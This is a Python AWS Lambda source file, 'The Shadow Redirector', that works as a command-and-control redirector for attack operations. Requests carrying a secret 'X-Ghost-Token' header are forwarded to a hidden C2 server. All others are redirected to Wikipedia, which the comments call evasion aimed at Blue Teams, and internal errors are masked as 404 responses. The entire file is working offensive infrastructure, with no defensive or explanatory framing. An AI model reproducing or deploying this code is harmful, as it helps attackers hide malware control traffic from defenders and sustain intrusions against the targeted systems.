import json
import os
import urllib.request
import urllib.error

# CONSTANTS (In prod, these come from Environment Variables)
C2_BRAIN_URL = os.environ.get('C2_URL', 'http://c2-brain-hidden-ip:9000/graphql')
SHARED_SECRET = os.environ.get('SHARED_SECRET', 'X-Ghost-Token: 7d9f8a')

def lambda_handler(event, context):
    """
    👻 The Shadow Redirector (AWS Lambda)
    
    Logic:
    1. Checks for a specific HTTP Header (Authentication).
    2. If valid, proxies the request to the Hidden C2 Brain.
    3. If invalid, redirects to a benign website (e.g., wikipedia.org) to confuse Blue Teams.
    """
    
    headers = event.get('headers', {})
    
    # Check for the Ghost's secret handshake
    # Note: Headers are case-insensitive in HTTP, but typically lowercase in AWS events
    auth_header = headers.get('x-ghost-token', '') or headers.get('X-Ghost-Token', '')
    
    expected_secret = SHARED_SECRET.split(': ')[1].strip()
    
    if auth_header != expected_secret:
        # 🛡️ EVASION: Redirect scanning attempts to benign site
        print(f"🚨 [SHADOW] Unauthorized probe from {event.get('requestContext', {}).get('http', {}).get('sourceIp')}")
        return {
            'statusCode': 302,
            'headers': {'Location': 'https://www.wikipedia.org'},
            'body': ''
        }
    
    # ✅ AUTHORIZED: Forward payload to C2 Brain
    try:
        body = event.get('body', '{}').encode('utf-8')
        
        # Create request to Brain
        req = urllib.request.Request(
            C2_BRAIN_URL, 
            data=body, 
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            brain_response = response.read().decode('utf-8')
            
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'application/json'},
                'body': brain_response
            }
            
    except Exception as e:
        print(f"❌ [SHADOW] Upstream Error: {str(e)}")
        # Don't reveal internal error, just 404
        return {
            'statusCode': 404,
            'body': 'Resource Not Found'
        }
